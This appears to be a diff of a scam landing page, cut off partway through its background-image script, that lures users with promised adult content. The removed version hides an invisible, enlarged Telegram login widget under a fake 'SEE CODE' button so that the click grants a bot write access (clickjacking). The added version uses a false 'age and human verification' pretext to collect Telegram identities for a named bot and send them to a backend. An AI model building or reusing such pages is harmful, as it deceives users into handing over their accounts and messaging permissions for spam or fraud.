@@ -3,203 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Verify</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-        
-        body { 
-            height: 100vh; 
-            background-color: #1a1a1a;
-            background-size: cover; 
-            background-position: center; 
-            background-repeat: no-repeat;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            position: relative;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 360px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            z-index: 2;
-        }
-
-        /* Floating Phone Icon */
-        .phone-icon-wrapper {
-            position: relative;
-            margin-bottom: -15px; /* Overlaps with the message box */
-            z-index: 3;
-            filter: drop-shadow(0 10px 10px rgba(0,0,0,0.3));
-        }
-        .phone-emoji {
-            font-size: 80px;
-            line-height: 1;
-        }
-        .mail-badge {
-            position: absolute;
-            top: 45%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 35px;
-        }
-
-        /* White Message Box */
-        .message-box {
-            background: #ffffff;
-            width: 100%;
-            padding: 16px;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 16px;
-            color: #333;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            margin-bottom: 20px;
-            position: relative;
-            z-index: 2;
-        }
-        .message-box span { vertical-align: middle; font-size: 18px; margin-left: 5px; }
-
-        /* 5 Empty PIN Boxes */
-        .pin-group {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-            width: 100%;
-            justify-content: space-between;
-        }
-        .pin-box {
-            width: 55px;
-            height: 65px;
-            border: 2px solid rgba(255, 255, 255, 0.6);
-            border-radius: 10px;
-            background: transparent;
-        }
-
-        /* See Code Button Wrapper */
-        .btn-wrapper {
-            position: relative;
-            width: 100%;
-            margin-bottom: 20px;
-        }
-
-        /* Visible Blue Button */
-        .see-code-btn {
-            width: 100%;
-            background-color: #5bb3f0;
-            color: white;
-            padding: 15px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        /* Hidden Telegram Login Widget (Catches the click) */
-        .telegram-widget {
-            position: absolute;
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%;
-            opacity: 0; /* Fully invisible */
-            overflow: hidden;
-            z-index: 5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        /* Make the telegram button giant so it covers the whole area */
-        .telegram-widget iframe { 
-            transform: scale(3); 
-            cursor: pointer; 
-        }
-
-        /* Number Keypad */
-        .keypad {
-            width: 100%;
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-        }
-        .key {
-            background-color: #5bb3f0;
-            color: white;
-            padding: 15px 0;
-            font-size: 20px;
-            font-weight: 600;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            cursor: default;
-        }
-        .key-empty { background: transparent; box-shadow: none; pointer-events: none; }
-        
-        /* Backspace Icon */
-        .key svg { vertical-align: middle; fill: white; width: 24px; height: 24px; }
-    </style>
+    <title>Age Verification - Access Bot</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
 </head>
 <body>
-
+    <div class="overlay"></div>
     <div class="container">
-        
-        <!-- Floating Phone & Mail Icon -->
-        <div class="phone-icon-wrapper">
-            <div class="phone-emoji">📱</div>
-            <div class="mail-badge">✉️</div>
-        </div>
-        
-        <!-- White Message Box -->
-        <div class="message-box">
-            Enter code to unlock <span>🔞</span>
-        </div>
-
-        <!-- 5 PIN Boxes -->
-        <div class="pin-group">
-            <div class="pin-box"></div>
-            <div class="pin-box"></div>
-            <div class="pin-box"></div>
-            <div class="pin-box"></div>
-            <div class="pin-box"></div>
-        </div>
-
-        <!-- Button with Hidden Telegram Login -->
-        <div class="btn-wrapper">
-            <div class="see-code-btn">SEE CODE 👀</div>
+        <div class="content-box">
             
-            <div class="telegram-widget">
-                <!-- আপনার বটের ইউজারনেম এখানে বসান -->
-                <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="YOUR_BOT_USERNAME" data-size="large" data-request-access="write"></script>
-            </div>
-        </div>
+            <!-- Title with Custom SVG Icons -->
+            <h2 class="title">
+                <div class="icon-group">
+                    <div class="custom-orb"></div>
+                    <svg viewBox="0 0 24 24" width="22" height="22" class="restricted-sign">
+                        <circle cx="12" cy="12" r="10" fill="none" stroke="#ff3333" stroke-width="2"/>
+                        <text x="12" y="16" fill="#ffffff" font-size="11" font-weight="900" font-family="sans-serif" text-anchor="middle">18</text>
+                        <line x1="6" y1="6" x2="18" y2="18" stroke="#ff3333" stroke-width="2"/>
+                    </svg>
+                </div>
+                
+                <span class="title-text">Welcome! Verify Your Age</span> 
+                
+                <div class="icon-group">
+                    <svg viewBox="0 0 24 24" width="22" height="22" class="custom-shield">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="rgba(0, 229, 255, 0.15)" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <div class="sparkles-container">
+                        <svg viewBox="0 0 24 24" width="12" height="12" class="sparkle s1"><path d="M12 0l2.5 8.5L23 11l-8.5 2.5L12 22l-2.5-8.5L1 11l8.5-2.5z" fill="#ffea00"/></svg>
+                        <svg viewBox="0 0 24 24" width="9" height="9" class="sparkle s2"><path d="M12 0l2.5 8.5L23 11l-8.5 2.5L12 22l-2.5-8.5L1 11l8.5-2.5z" fill="#ffea00"/></svg>
+                    </div>
+                </div>
+            </h2>
+            
+            <!-- Subtitle with Custom Badges -->
+            <p class="subtitle">
+                <span class="badge-18">18+</span> To access our age-restricted content, please confirm that you are 18 years or older and complete a quick human verification. 
+                <span class="subtitle-icons">
+                    <svg viewBox="0 0 24 24" width="14" height="14" fill="#ffd700">
+                        <path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V12a2 2 0 00-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm3 11.5c-1.103 0-2-.897-2-2s.897-2 2-2 2 .897 2 2-.897 2-2 2z"/>
+                    </svg>
+                    <svg viewBox="0 0 24 24" width="14" height="14">
+                        <rect width="24" height="24" rx="4" fill="#00e676"/>
+                        <path d="M7 12l3.5 3.5 6.5-7" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </span>
+            </p>
 
-        <!-- Keypad Grid -->
-        <div class="keypad">
-            <div class="key">1</div>
-            <div class="key">2</div>
-            <div class="key">3</div>
-            <div class="key">4</div>
-            <div class="key">5</div>
-            <div class="key">6</div>
-            <div class="key">7</div>
-            <div class="key">8</div>
-            <div class="key">9</div>
-            <div class="key-empty"></div>
-            <div class="key">0</div>
-            <div class="key">
-                <svg viewBox="0 0 24 24"><path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2zm-2.58 11.59l-1.42 1.41L14 14.17l-2.99 2.83-1.42-1.41L12.58 12 9.59 9.01l1.42-1.41L14 10.43l2.99-2.83 1.42 1.41L15.42 12l2.99 2.99z"/></svg>
+            <!-- Telegram Login Widget (আগের বাটনের বদলে এটি বসানো হলো) -->
+            <div style="display: flex; justify-content: center; margin-top: 20px;">
+                <script async src="https://telegram.org/js/telegram-widget.js?22" 
+                        data-telegram-login="Desi_Magi909_Bot" 
+                        data-size="large" 
+                        data-onauth="onTelegramAuth(user)" 
+                        data-request-access="write"></script>
             </div>
+
         </div>
     </div>
 
-    <!-- Random Background Script -->
+    <!-- ব্যাকএন্ডে ডেটা পাঠানোর জাভাস্ক্রিপ্ট -->
+    <script>
+        function onTelegramAuth(user) {
+            fetch('/auth', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(user)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Verification Successful! 🔞");
+                // ভেরিফাই হওয়ার পর সরাসরি আপনার বটে নিয়ে যাবে
+                window.location.href = "https://t.me/Desi_Magi909_Bot?start=start"; 
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+
     <script>
         const images = [
             "https://carder.top/imagens/1791918460640-323067073.jpg",
